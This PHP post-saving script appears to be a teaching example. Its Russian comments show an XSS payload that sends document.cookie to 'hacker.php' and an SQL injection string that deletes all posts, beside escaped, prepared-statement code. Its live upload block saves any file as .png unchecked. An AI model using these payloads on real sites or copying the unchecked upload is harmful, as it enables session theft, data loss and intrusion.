<?php

require_once 'init.php';

if (!getUserAuth()) {
    // user not authorized
    header('Location: registerForm.php');
    die;
}

$db = getDbConnection();

/**
 * Вот такое сообщение украдет куки
 * <script>
i = new Image(); i.src = "hacker.php/?" + document.cookie;
</script>
 */


$message = htmlspecialchars($_POST['message']); // безопасно
//$message = $_POST['message']; // не безопасно
$userId = $_SESSION['user']['id'];
$date = date('Y-m-d H:i:s');

// такой код удалит все посты
// rand message', '2012-01-01'); DELETE FROM posts;

$query = "
        INSERT 
          INTO posts 
          (
              user_id, 
              message, 
              `datetime`
          ) 
          VALUES 
          (
            $userId,
            :placeholder,
            '$date'
          );";

// $ret = $db->query($query); // не безопасно

// безопасно
$prepared = $db->prepare($query);
$ret = $prepared->execute(['placeholder' => $message]);

$postId = $db->lastInsertId();

if (!empty($_FILES['userfile']['tmp_name'])) {
    $fileContent = file_get_contents($_FILES['userfile']['tmp_name']);
    file_put_contents('../../images/'. $postId . '.png', $fileContent);
}



if (!$ret) {
    print_r($db->errorInfo());
    echo 'error';
    die;
}

header('Location: index.php');